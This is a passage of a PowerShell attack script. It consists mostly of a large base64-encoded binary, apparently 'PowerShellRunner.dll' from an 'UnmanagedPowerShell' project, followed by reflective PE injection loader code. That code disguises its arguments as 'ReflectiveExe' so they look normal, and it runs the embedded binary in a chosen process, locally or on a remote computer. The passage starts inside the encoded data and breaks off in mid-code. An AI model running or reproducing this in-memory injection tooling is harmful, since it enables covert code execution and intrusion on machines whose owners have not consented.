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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/////wAAAAAAAAAAAAAAAP////+ACgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/////AAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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MzczQTOgM9cz8TMXNJo0DjWONcw11TXzNWU2MjdhN2o3wDfJN6Y4sTjEONg4mjmjOa86uDqkO+479zsfPHk8sDwFPRc9KT07PU09Xz1xPYM9lT2nPbk9yz3dPfw9Dj4gPjI+RD4AAACgAAB0AAAA2jE/Mr8yrjNBNH40/zQRNWU2bDabN7c3+Dj/OJI5mDm6OeM5DDoaOiA6XDrTOgo7IDtGO8A7/TsHPCY8eDyUPN486jwRPSc9Oj1cPWM9rz3DPQc+ED4ZPlU+cj6RPks/VT9wP4o/mT+4PwAAALAAAIAAAAAAMAowEDAkMDAwgTDDMNQw6DDuMPMwsDFUMkwzUjNWM1szYTNlM2szbzN1M3kzfjOEM4gzjjOSM5gznDOiM6YztzMuNFA1WDUAN5I3njcsODQ4QDhPONs48jgpOaA5wjrKOnI8BD0QPZ49pj2yPcE9TT5kPp4+Jj8AwAAAMAAAAIYymDIMNhA2FDYYNhw2IDYkNig2LDYwNjQ2ODYbO3I7tTtvPTA+AAAA0AAAIAAAADgzQzOmNNY0hjd2OTQ6TTpcOn06tToSOwDgAABEAAAATjWFN5A3oDfSNwo4JjgrODo4Zzh7OIo4FTkwOUk5qznoOQE6GzozOmY6bjqCOog6jjq8Ov86GjsxOzc7APAAAEAAAAA4MUQxSDFMMVAxXDFgMWQxmDucO6A7uDu8O8A7+Dv8OwA8BDwIPAw8EDwUPNQ/3D/kP+w/9D/8PwAAAQDUAAAABDAMMBQwHDAkMCwwNDA8MEQwTDBUMFwwZDBsMHQwfDCEMDQ6ODo8OkA6wD7EPsg+zD7QPtQ+2D7cPuA+5D7oPuw+8D70Pvg+/D4APwQ/CD8MPxA/FD8YPxw/ID8kPyg/LD8wPzQ/OD88P0A/RD9IP0w/UD9UP1g/XD9gP2Q/aD9sP3A/dD94P3w/gD+EP4g/jD+QP5Q/mD+cP6A/pD+oP6w/sD+0P7g/vD/AP8Q/yD/MP9A/1D/YP9w/4D/kP+g/7D/wP/Q/+D/8PwAAABABAJAAAAAAMAQwCDAMMBAwFDAYMBwwIDAkMCgwLDAwMDQwODA8MEAwRDBIMHw+hD6MPpQ+nD6kPqw+tD68PsQ+zD7UPtw+5D7sPvQ+/D4EPww/FD8cPyQ/LD80Pzw/RD9MP1Q/XD9kP2w/dD98P4Q/jD+UP5w/pD+sP7Q/vD/EP8w/1D/cP+Q/7D/0P/w/ACABADgDAAAEMAwwFDAcMCQwLDA0MDwwRDBMMFQwXDBkMGwwdDB8MIQwjDCUMJwwpDCsMLQwvDDEMMww1DDcMOQw7DD0MPwwBDEMMRQxHDEkMSwxNDE8MUQxTDFUMVwxZDFsMXQxfDGEMYwxlDGcMaQxrDG0MbwxxDHMMdQx3DHkMewx9DH8MQQyDDIUMhwyJDIsMjQyPDJEMkwyVDJcMmQybDJ0MnwyhDKMMpQynDKkMqwytDK8MsQyzDLUMtwy5DLsMvQy/DIEMwwzFDMcMyQzLDM0MzwzRDNMM1QzXDNkM2wzdDN8M4QzjDOUM5wzpDOsM7QzvDPEM8wz1DPcM+Qz7DP0M/wzBDQMNBQ0HDQkNCw0NDQ8NEQ0TDRUNFw0ZDRsNHQ0fDSENIw0lDScNKQ0rDS0NLw0xDTMNNQ03DTkNOw09DT8NAQ1DDUUNRw1JDUsNTQ1PDVENUw1VDVcNWQ1bDV0NXw1hDWMNZQ1mDWgNag1sDW4NcA1yDXQNdg14DXoNfA1+DUANgg2EDYYNiA2KDYwNjg2QDZINlA2WDZgNmg2cDZ4NoA2iDaQNpg2oDaoNrA2uDbANsg20DbYNuA26DbwNvg2ADcINxA3GDcgNyg3MDc4N0A3SDdQN1g3YDdoN3A3eDeAN4g3kDeYN6A3qDewN7g3wDfIN9A32DfgN+g38Df4NwA4CDgQOBg4IDgoODA4ODhAOEg4UDhYOGA4aDhwOHg4gDiIOJA4mDigOKg4sDi4OMA4yDjQONg44DjoOPA4+DgAOQg5EDkYOSA5KDkwOTg5QDlIOVA5WDlgOWg5cDl4OYA5iDmQOZg5oDmoObA5uDnAOcg50DnYOeA56DnwOfg5ADoIOhA6GDogOig6MDo4OkA6SDpQOlg6YDpoOnA6eDqAOog6kDqYOqA6qDqwOrg6wDrIOtA62DrgOug68Dr4OgA7CDsQOxg7IDsoOzA7ODtAO0g7UDtYO2A7aDtwO3g7gDuIO5A7mDugO6g7sDu4O8A7yDvQO9g74DvoO/A7+DsAPAg8EDwYPCA8KDwwPDg8QDxIPFA8WDxgPGg8cDx4PIA8iDyQPJg8oDyoPLA8AAAAMAEAEAAAAIg/tD/0P/g/AEABANwAAAAAMBgwKDAsMEAwRDBUMFgwXDBkMHwwjDCQMKAwpDC0MLgwwDDYMOgw7DD8MAAxBDEMMSQxZDFwMZQxtDG8McQxzDHUMdwx5DHsMfAx+DEMMhQyKDJIMmgyhDKIMqgytDLQMtwy9DL4MhQzGDM4M0AzRDNgM2gzbDOEM4gzpDOoM7gz3DPoM/AzHDQgNCg0MDQ4NDw0RDRYNHg0mDS4NNg0+DQYNSQ1QDVgNYA1nDWgNcA14DUANiA2QDZgNoA2oDbANtw24Db8NgA3CDcQNxg3IDc0NwCAAQAMAAAAgDmIOQCQAQAgAQAArDGoMqwysDK0MrgyvDLAMsQyyDLMMtAy1DLYMtwy4DLkMugy7DLwMvQy+DL8MgAzBDMIMwwzEDMUMxgzHDMgMyQzKDMsMzAzNDM4MzwzQDNEM0gzTDNQM1wzYDNkM2gzbDNwM3QzeDN8M4AzhDOIM4wzkDOUM5gznDOgM6QzqDOsM7AztDO4M7wzwDPEM8gzzDPQM9Qz2DPcM+Az5DPoM+wz8DP0M/gz/DMANAQ0CDQMNDQ0RDRUNGQ0dDSUNKA0pDSoNKw0zDTQNNQ02DTcNOA05DToNOw08DT0NPg0IDUoNSw1MDU0NTg1PDVANUQ1SDVMNVg1XDVgNWQ1aDVsNXA1dDV8NYA1kDXcOPA4DDkoOUA5YDkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
    

    #Add a "program name" to exeargs, just so the string looks as normal as possible (real args start indexing at 1)
    if ($ExeArgs -ne $null -and $ExeArgs -ne '')
    {
        $ExeArgs = "ReflectiveExe $ExeArgs"
    }
    else
    {
        $ExeArgs = "ReflectiveExe"
    }
    
    [System.IO.Directory]::SetCurrentDirectory($pwd)

    if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
    {
        Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, $FuncReturnType, $ProcId, $ProcName,$ForceASLR, $PoshCode)
    }
    else
    {
